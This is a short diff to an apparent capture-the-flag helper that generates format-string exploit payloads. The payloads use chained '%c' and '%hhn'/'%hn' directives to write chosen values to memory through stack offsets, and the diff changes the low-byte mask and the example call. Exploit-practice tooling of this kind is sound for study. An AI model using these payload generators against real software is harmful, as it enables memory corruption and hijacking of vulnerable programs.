@@ -79,8 +79,8 @@ def fmt_bss(offset1,offset2,address,value,n=0,written=0,arch='amd64',typex='byte
     tmp = "%{byte}c%{soffset}$"+config[arch][typex][3]+"n"
     for i in range(n):
         saddress = address + i*config[arch][typex][1]
-        byte1 = saddress&config[arch][typex][2]
-        tmp1 = tmp.format(byte=byte1,soffset=offset1)
+        byte1 = saddress&0xff
+        tmp1 = "%{byte}c%{soffset}$hhn".format(byte=byte1,soffset=offset1)
         payload.append(tmp1)
         byte2 = value>>(i*config[arch][typex][4])&config[arch][typex][2]
         tmp2 = tmp.format(byte=byte2,soffset=offset2)
@@ -91,4 +91,5 @@ def fmt_bss(offset1,offset2,address,value,n=0,written=0,arch='amd64',typex='byte
 
 
 if __name__ == "__main__":
-    print fmt_bss(10,18,0x4c,0x80485AB,arch='i386',n=2)
+    # print '|'.join(fmt_bss(10,18,0x4c,0x80485AB,arch='i386',n=2,typex='short'))
+    print fmt_bss(10,18,0x4c,0x80485AB,arch='i386',n=2,typex='short')
